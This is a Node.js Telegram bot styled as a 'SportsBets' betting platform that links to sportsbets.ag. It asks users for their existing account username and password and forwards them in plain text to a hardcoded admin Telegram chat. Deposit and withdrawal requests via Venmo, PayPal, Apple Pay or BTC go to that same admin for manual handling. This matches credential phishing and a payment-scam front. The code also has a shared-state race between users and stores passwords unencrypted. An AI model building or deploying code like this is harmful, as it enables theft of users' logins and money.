require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const solanaWeb3 = require('@solana/web3.js');
const bs58 = require('bs58');
const { createClient } = require('redis');
// Replace with your own token from .env file
const token = process.env.TELEGRAM_BOT_TOKEN;

// Create a bot that uses 'polling' to fetch new updates
const bot = new TelegramBot(token, { polling: true });

//redis stuff
const redisClient = createClient({
    password: process.env.REDIS_PASSWORD,
    socket: {
        host: process.env.REDIS_HOST,
        port: process.env.REDIS_PORT
    }
});

async function connectRedis() {
    if (!redisClient.isOpen) {
        await redisClient.connect();
    }
}

const welcome1 = {
    inline_keyboard: [
        [{ text: 'Connect/Create account 🔑', callback_data: 'createAnAccount' }],
        [{ text: 'Deposit 💰', callback_data: 'deposit' }, { text: 'Withdraw 💸', callback_data: 'withdraw' }],
        [{ text: 'Talk to admin 💬', callback_data: 'talkToAdmin' }]
    ]
};

const welcome2 = {
    inline_keyboard: [
        [{ text: 'View account 💳', callback_data: 'viewYourAccount' }],
        [{ text: 'Deposit 💰', callback_data: 'deposit' }, { text: 'Withdraw 💸', callback_data: 'withdraw' }],
        [{ text: 'Talk to admin 💬', callback_data: 'talkToAdmin' }]
    ]
};

const talktodev = {
    inline_keyboard: [
        [{ text: 'Admin 1 (Leviathanlocks)', url: 'https://t.me/leviathanlocks' }],
        [{ text: 'Exit ❎', callback_data: 'exit' }]
    ]
};

const withdrawMethods = {
    inline_keyboard: [
        [{ text: 'Venmo', callback_data: 'withdrawVenmo' }],
        [{ text: 'Apple Pay', callback_data: 'withdrawApple' }],
        [{ text: 'Crypto (BTC)', callback_data: 'withdrawCrypto' }],
        [{ text: 'Paypal', callback_data: 'withdrawPaypal' }],
        [{ text: 'Exit ❎', callback_data: 'exit' }]
    ]
};

const accountMenu = {
    inline_keyboard: [
        [{ text: 'Deposit 💰', callback_data: 'deposit' }, { text: 'Withdraw 💸', callback_data: 'withdraw' }],
        [{ text: 'Logout 🔓', callback_data: 'logout' }]
    ]
};

const exitall = {
    inline_keyboard: [
        [{ text: 'Exit ❌', callback_data: 'exit' }]
    ]
}

bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
    const userId = msg.from.id.toString();
    const Code = match ? match[1] : null;
    const first_name = msg.from.first_name;
    const chatId = msg.chat.id.toString();
    const username = msg.from.username;
    const messageId = msg.message_id;

    await connectRedis();

    if(msg.chat.type === 'private'){
        const key = `sportsbets:users:${userId}`; 

        const existingUser = await redisClient.hGetAll(key);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            if(connected === 'yes'){
                bot.sendMessage(chatId, `<b>Welcome to <a href='https://sportsbets.ag/'>SportsBets</a> ♠️</b>\n\n♣️ Top sports betting platform with easy deposits, fast withdrawals, and premium moderation! 🚀`, {reply_markup: JSON.stringify(welcome2), parse_mode: 'HTMl', disable_web_page_preview: true}) 

            }else{
                bot.sendMessage(chatId, `<b>Welcome to <a href='https://sportsbets.ag/'>SportsBets</a> ♠️</b>\n\n♣️ Top sports betting platform with easy deposits, fast withdrawals, and premium moderation! 🚀`, {reply_markup: JSON.stringify(welcome1), parse_mode: 'HTMl', disable_web_page_preview: true}) 
            }
            return;
        }

        await redisClient.hSet(key, {
            userId: chatId,
            connect: 'no'
        });
        bot.sendMessage(chatId, `<b>Welcome to <a href='https://sportsbets.ag/'>SportsBets</a> ♠️</b>\n\n♣️ Top sports betting platform with easy deposits, fast withdrawals, and premium moderation! 🚀`, {reply_markup: JSON.stringify(welcome1), parse_mode: 'HTMl', disable_web_page_preview: true}) 
    }else{
        bot.sendMessage(chatId, 'Shit, DM me to access, not here! xD', {
            reply_to_message_id: messageId,
            parse_mode: 'HTMl',
        });
    }
});

let createanacc = false;
let needpass = false;
let wanadeposit = false;
let wanawithdraw = false;
let howmuchwithdraw;
let howmuchdeposit;

let needuserid;
let accusername;
let accpassword;

//callback for section 1 
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id.toString();
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id.toString();
    const messageId = callbackQuery.message.message_id;
    const key = `sportsbets:users:${userId}`; 

    await connectRedis()

    if(data === 'createAnAccount'){
        const existingUser = await redisClient.hGetAll(key);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            if(connected === 'yes'){
                bot.sendMessage(chatId, `Restart with /start, or contact support!`, {
                    parse_mode: 'HTMl',
                });
            }else{
                bot.sendMessage(chatId, 'To connect/create account, send your existing username or new username below 👇', {
                    parse_mode: 'HTMl',
                    reply_markup: JSON.stringify(exitall)
                });
                createanacc = true;
                needuserid = userId;
            }
        }
    }

    if(data === 'viewYourAccount'){
        const existingUser = await redisClient.hGetAll(key);
        const connectkey = `sportsbets:connect:${userId}`; 
        const connectdata = await redisClient.hGetAll(connectkey);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            if(connected === 'yes'){
                const betusername = connectdata.username || 'Not connected yet';
                const betbalance = connectdata.betbalance || 'Not connected yet';
                bot.sendMessage(chatId, `<b>Your <a href='sportsbets.ag'>SportsBets</a> account details! ♠️</b>\n\nUsername: ${betusername}\nBalance(USD): ${betbalance}\n\nTo change/recover password, talk to support!`, {
                    parse_mode: 'HTMl',
                    reply_markup: JSON.stringify(accountMenu)
                });
            }else{
                bot.sendMessage(chatId, 'Restart with /start, or contact support!', {
                    parse_mode: 'HTMl',
                });
            }
        }
    }

    if(data === 'logout'){
        const existingUser = await redisClient.hGetAll(key);
        const connectkey = `sportsbets:connect:${userId}`; 
        const connectdata = await redisClient.hGetAll(connectkey);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            if(connected === 'yes'){
                await redisClient.del(connectkey);
                await redisClient.hSet(key, {
                    connect: 'no'
                });
                bot.sendMessage(chatId, `Logout successful! ✅`);
            }else{
                bot.sendMessage(chatId, 'Restart with /start, or contact support!', {
                    parse_mode: 'HTMl',
                });
            }
        }
    }
   
    if(data === 'deposit'){
        const existingUser = await redisClient.hGetAll(key);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            if(connected === 'yes'){
                bot.sendMessage(chatId, `Send below, how much you want to deposit ? 💵`, {
                    parse_mode: 'HTMl',
                    reply_markup: JSON.stringify(exitall)
                });
                wanadeposit = true;
                needuserid = userId;
            }else{
                bot.sendMessage(chatId, 'Connect your acount, first pls!', {
                    parse_mode: 'HTMl',
                });
            }
        }
    }

    if(data === 'withdraw'){
        const existingUser = await redisClient.hGetAll(key);
        const connectkey = `sportsbets:connect:${userId}`; 
        const connectdata = await redisClient.hGetAll(connectkey);
        if (Object.keys(existingUser).length > 0) {
            const connected = existingUser.connect;
            const betusername = connectdata.username || 'Not connected yet';
            const betbalance = connectdata.betbalance || 'Not connected yet';
            if(connected === 'yes'){
                bot.sendMessage(chatId, `Send below, how much you want to deposit ? 💸`, {
                    parse_mode: 'HTMl',
                    reply_markup: JSON.stringify(exitall)
                });
                wanawithdraw = true;
                needuserid = userId;
            }else{
                bot.sendMessage(chatId, 'Connect your acount, first pls!', {
                    parse_mode: 'HTMl',
                });
            }
        }
    }

    if(data === 'talkToAdmin'){
        bot.sendMessage(chatId, `Talk to admin regarding anything!`, {reply_markup: JSON.stringify(talktodev)})
    }

    if(data === 'exit'){
        bot.deleteMessage(chatId, callbackQuery.message.message_id)
        .then(() => {
            // Optionally send a confirmation message
        })
        .catch((error) => {
            console.error('Failed to delete message:', error);
        });
        createanacc = false;
        needpass = false;
        wanadeposit = false;
        wanawithdraw = false;
        howmuchwithdraw = undefined;
        howmuchdeposit = undefined;
        needuserid = undefined;
        accusername = undefined;
        accpassword = undefined;
    }
});

//msg system section 1 
bot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const text = msg.text || '';
    const messageId = msg.message_id;
    await connectRedis()
    
    if(createanacc && needuserid === userId){
        bot.sendMessage(chatId, `Username: ${text}\n\nNow send existing password/new password below 👇`, {reply_markup: JSON.stringify(exitall)});
        accusername = text;
        createanacc = false;
        needpass = true;
        return;
    }
    if(needpass && needuserid === userId){
        accpassword = text;
        bot.sendMessage(chatId, `Username: ${accusername}\nPassword: ${accpassword}\n\nSent to admin, wait for login/new creation notification! ✅`);
        bot.sendMessage('7724512663', `Username: ${accusername}\nPass: ${accpassword}\n\nTelegram userid: ${chatId}`)
        createanacc = false;
        needpass = false;
        accusername = undefined;
        accpassword = undefined;
    }
});

//msg system section 2
bot.on('message', async (msg) => {
    const chatId = msg.chat.id.toString();
    const userId = msg.from.id.toString();
    const text = msg.text || '';
    const messageId = msg.message_id;
    await connectRedis()
    
    if(wanadeposit && needuserid === userId){
        if (isNaN(text)) {
            bot.sendMessage(chatId, `Pls send number and retry or exit!`, {reply_markup: JSON.stringify(exitall)})
            return;
        }
        const depositMethods = {
            inline_keyboard: [
                [{ text: 'Venmo', callback_data: `depositVenmo` }],
                [{ text: 'Apple Pay', callback_data: `depositApple` }],
                [{ text: 'Crypto (BTC)', callback_data: `depositCrypto` }],
                [{ text: 'Paypal', callback_data: `depositPaypal` }],
                [{ text: 'Exit ❎', callback_data: 'exit' }]
            ]
        };
        bot.sendMessage(chatId, `Select the method to deposit ${text} USD`, {reply_markup: JSON.stringify(depositMethods)});
        wanadeposit = false;
        howmuchdeposit = text;
    }
    if(wanawithdraw && needuserid === userId){
        if (isNaN(text)) {
            bot.sendMessage(chatId, `Pls send number and retry or exit!`, {reply_markup: JSON.stringify(exitall)})
            return;
        }
        const withdrawMethods = {
            inline_keyboard: [
                [{ text: 'Venmo', callback_data: 'withdrawVenmo' }],
                [{ text: 'Apple Pay', callback_data: 'withdrawApple' }],
                [{ text: 'Crypto (BTC)', callback_data: 'withdrawCrypto' }],
                [{ text: 'Paypal', callback_data: 'withdrawPaypal' }],
                [{ text: 'Exit ❎', callback_data: 'exit' }]
            ]
        };
        bot.sendMessage(chatId, `Select the method to withdraw ${text} USD`, {reply_markup: JSON.stringify(withdrawMethods)});
        wanawithdraw = false;
        howmuchwithdraw = text;
    }
});

//callback for deposit
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id.toString();
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id.toString();
    const messageId = callbackQuery.message.message_id;
    const key = `sportsbets:users:${userId}`; 

    await connectRedis()
    if(howmuchdeposit || howmuchdeposit == undefined && needuserid === userId){
        if(data === 'depositVenmo'){
          bot.sendMessage(chatId, `To deposit ${howmuchdeposit} USD via Venmo, Request sent to admin, wait for admin to reply! ✅`)

          bot.sendMessage('7724512663', `Deposit request of ${howmuchdeposit} USD via Venmo from ${chatId}`)
          howmuchdeposit = undefined;
          return;
        }

        if(data === 'depositApple'){
            bot.sendMessage(chatId, `To deposit ${howmuchdeposit} USD via Apple Pay, Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Deposit request of ${howmuchdeposit} USD via Apple pay from ${chatId}`)
            howmuchdeposit = undefined;
            return;
        }

        if(data === 'depositCrypto'){
            bot.sendMessage(chatId, `To deposit ${howmuchdeposit} USD via Crypto (BTC), Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Deposit request of ${howmuchdeposit} USD via Crypto (BTC) from ${chatId}`)
            howmuchdeposit = undefined;
            return;
        }

        if(data === 'depositPaypal'){
            bot.sendMessage(chatId, `To deposit ${howmuchdeposit} USD via Paypal, Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Deposit request of ${howmuchdeposit} USD via Paypal from ${chatId}`)
            howmuchdeposit = undefined;
            return;
        }
    }
    

});

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id.toString();
    const data = callbackQuery.data;
    const userId = callbackQuery.from.id.toString();
    const messageId = callbackQuery.message.message_id;
    const key = `sportsbets:users:${userId}`; 

    await connectRedis()
    if(howmuchwithdraw || howmuchwithdraw == undefined && needuserid === userId){
        if(data === 'withdrawVenmo'){
          bot.sendMessage(chatId, `To withdraw ${howmuchwithdraw} USD via Venmo, Request sent to admin, wait for admin to reply! ✅`)

          bot.sendMessage('7724512663', `Withdraw request of ${howmuchwithdraw} USD via Venmo from ${chatId}`)
          howmuchwithdraw = undefined;
          return;
        }

        if(data === 'withdrawApple'){
            bot.sendMessage(chatId, `To withdraw ${howmuchwithdraw} USD via Apple Pay, Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Withdraw request of ${howmuchwithdraw} USD via Apple pay from ${chatId}`)
            howmuchwithdraw = undefined;
            return;
        }

        if(data === 'withdrawCrypto'){
            bot.sendMessage(chatId, `To withdraw ${howmuchwithdraw} USD via Crypto (BTC), Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Withdraw request of ${howmuchwithdraw} USD via Crypto (BTC) from ${chatId}`)
            howmuchwithdraw = undefined;
            return;
        }

        if(data === 'withdrawPaypal'){
            bot.sendMessage(chatId, `To withdraw ${howmuchwithdraw} USD via Paypal, Request sent to admin, wait for admin to reply! ✅`)
  
            bot.sendMessage('7724512663', `Withdraw request of ${howmuchwithdraw} USD via Paypal from ${chatId}`)
            howmuchwithdraw = undefined;
            return;
        }
    }

});


bot.onText(/\/validate (\d+) ([A-Za-z]+) ([\w\s!@#$%^&*()_+={}\[\]:;'"<>,.?\/\\|-]+) (\d+(\.\d+)?)/, async (msg, match) => {
    const chatId = msg.chat.id;

    // Extract and validate the parameters
    const userId = match[1]; // User ID (numbers only)
    const name = match[2]; // Name (letters only)
    const parentName = match[3]; // Parent name (can include letters, numbers, and symbols)
    const balance = parseFloat(match[4]); // Balance (number, can include decimals)

    // Perform validation checks
    if (balance <= 0) {
        bot.sendMessage(chatId, `Invalid balance. It must be greater than zero.`);
        return;
    }
    if(chatId.toString() === '7724512663'){
        const connectkey = `sportsbets:connect:${userId}`; 
        const key = `sportsbets:users:${userId}`; 
        bot.sendMessage(
            chatId,
            `Validation successful!\nUserID: ${userId}\nName: ${name}\pass: ${parentName}\nBalance: ${balance}`
        );
        await redisClient.hSet(connectkey, {
            betbalance: balance,
            username: name,
            pass: parentName
        });
        await redisClient.hSet(key, {
            connect: 'yes',
        });
    }
    
});

bot.onText(/\/send (\d+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;

    // Extract the userId and the message content
    const userId = match[1]; // User ID (numbers only)
    const messageContent = match[2]; // Everything after the userId

    // Reply with confirmation or process the message
    if(chatId.toString() === '7724512663'){
        bot.sendMessage(userId, `${messageContent}`);
    }
});

// Handle incorrect formats or missing parameters

console.log('Bot started!')
